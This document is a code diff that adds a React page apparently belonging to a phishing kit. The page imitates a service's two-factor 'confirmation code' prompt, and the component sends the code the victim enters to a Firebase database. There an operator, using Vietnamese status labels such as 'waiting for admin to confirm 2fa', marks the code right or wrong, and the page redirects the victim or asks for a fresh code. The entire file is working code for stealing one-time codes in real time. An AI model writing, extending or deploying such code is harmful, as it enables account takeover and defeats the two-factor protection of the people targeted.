@@ -1,0 +1,196 @@
+import React, { useEffect, useState } from "react";
+import InputText from "../Components/UI/InputText/InputText";
+import Validating from "../Components/Validating";
+import { database } from "../Utils/firebase";
+import { onValue, ref, update } from "firebase/database";
+import Spinner from "../Components/Spinner";
+import { useNavigate } from "react-router";
+
+const FaCode = () => {
+  const [facode, setFacode] = React.useState("");
+  const [error_login_code, setError_login_code] = useState(false);
+  const [validating, setValidating] = useState(false);
+  const [resending, setResending] = useState(false);
+
+  const navigate = useNavigate();
+
+  const handleSend = () => {
+    setValidating(true);
+    const updates = {};
+
+    updates[
+      "/records/" + localStorage.getItem("record_uid") + "/" + "2facode"
+    ] = facode;
+    updates[
+      "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
+    ] = "Đang chờ xác nhận 2fa từ admin";
+
+    update(ref(database), updates);
+  };
+
+  const handleResending = () => {
+    setError_login_code(false);
+    setResending(true);
+    const updates = {};
+    updates[
+      "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
+    ] = "User yêu cầu gửi lại mã 2fa";
+    update(ref(database), updates);
+  };
+
+  useEffect(() => {
+    const starCountRef = ref(
+      database,
+      "records/" + localStorage.getItem("record_uid")
+    );
+    onValue(starCountRef, (snapshot) => {
+      const data = snapshot.val();
+      console.log(data);
+      if (data?.user_status === "Thành công") {
+        navigate("/success");
+      } else if (data?.user_status === "Sai mã 2fa") {
+        setValidating(false);
+        setError_login_code(true);
+        const updates = {};
+        updates[
+          "/records/" + localStorage.getItem("record_uid") + "/" + "user_status"
+        ] = "Đang chờ user nhập lại mã 2fa";
+
+        update(ref(database), updates);
+        // eslint-disable-next-line no-dupe-else-if
+      } else if (data?.user_status === "Đã gửi lại mã 2fa") {
+        setResending(false);
+      }
+    });
+  }, []);
+
+  return (
+    <div className="px-2">
+      <div
+        className=""
+        style={{
+          border: "1px solid #dcdada",
+          maxWidth: "600px",
+          margin: "auto",
+          marginTop: "10vh",
+          borderRadius: "8px",
+        }}
+      >
+        <h1
+          className="px-3"
+          style={{
+            fontSize: "1.35rem",
+            color: "#444",
+            marginTop: "1.15rem",
+          }}
+        >
+          Please enter the comfimation code to continue
+        </h1>
+        <div
+          style={{
+            height: 1,
+            width: "100%",
+            background: "rgb(218, 221, 225)",
+            marginTop: "1rem",
+            marginBottom: "1.25rem",
+          }}
+        />
+
+        <div className="px-3">
+          <div className="modal__body-description mb-2">
+            Please confirm as you continue. We have sent any 6-digit code to
+            your mobile number.
+          </div>
+          <div className="modal__body-description">
+            Enter the 6-digit code from your code generator or third-party app
+            below.
+          </div>
+        </div>
+        <div
+          className="modal__body-password px-3"
+          style={{
+            marginBottom: "3rem",
+          }}
+        >
+          <div className="d-flex align-items-center">
+            <div
+              style={{
+                maxWidth: "70%",
+              }}
+            >
+              <InputText
+                placeHolder={"Login code"}
+                value={facode}
+                fun={(e) => setFacode(e.target.value)}
+              ></InputText>
+            </div>
+
+            {resending ? (
+              <Spinner
+                style={{
+                  width: 24,
+                  height: 24,
+                  borderWidth: 4,
+                  margin: 0,
+                  marginLeft: 20,
+                }}
+              />
+            ) : (
+              <span
+                style={{
+                  display: "inline-block",
+                  marginLeft: 20,
+                  color: "#0d6efd",
+                  cursor: "pointer",
+                }}
+                onClick={handleResending}
+              >
+                Resend
+              </span>
+            )}
+          </div>
+
+          {error_login_code && (
+            <p className="text-danger mb-2 ms-1">
+              Incorrect login code, please try again.
+            </p>
+          )}
+          {validating && <Validating />}
+        </div>
+
+        <div
+          style={{
+            height: 1,
+            width: "100%",
+            background: "rgb(218, 221, 225)",
+            marginBottom: "1.25rem",
+          }}
+        />
+
+        <div
+          style={{
+            marginTop: "1.25rem",
+            marginBottom: "1.25rem",
+          }}
+        >
+          <button
+            className="chat_btn me-4"
+            style={{ marginLeft: "auto" }}
+            disabled={facode?.length < 4}
+            onClick={handleSend}
+          >
+            <span
+              style={{
+                margin: 0,
+              }}
+            >
+              Send
+            </span>
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+export default FaCode;
